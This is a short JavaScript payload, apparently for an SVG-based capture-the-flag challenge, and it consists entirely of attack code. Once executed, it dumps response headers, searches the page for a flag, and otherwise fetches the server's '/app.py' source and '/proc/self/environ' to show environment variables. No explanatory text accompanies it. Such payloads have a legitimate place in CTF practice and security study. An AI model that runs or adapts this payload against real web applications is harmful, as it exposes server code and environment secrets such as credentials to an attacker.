svg.script:
try {
  const flagText = document.getElementById('flagText');

  fetch('/')
    .then(response => {
      let headers = '';
      for (let pair of response.headers.entries()) {
        headers += `${pair[0]}: ${pair[1]}\n`;
      }
      flagText.textContent = `Headers:\n${headers}`;
      return response.text();
    })
    .then(text => {
      if (text.includes('flag{') || text.includes('FLAG{')) {
        flagText.textContent = `Found flag in response:\n${text}`;
      } else {
        fetch('/app.py')
          .then(r => r.text())
          .then(code => {
            flagText.textContent = `Server code:\n${code}`;
          })
          .catch(() => {
            fetch('/proc/self/environ')
              .then(r => r.text())
              .then(env => {
                flagText.textContent = `Environment:\n${env}`;
              })
              .catch(() => {
                flagText.textContent = 'Could not find flag in common locations';
              });
          });
      }
    })
    .catch(error => {
      flagText.textContent = `Error: ${error}`;
    });
} catch (e) {
  alert('Script error: ' + e);
}
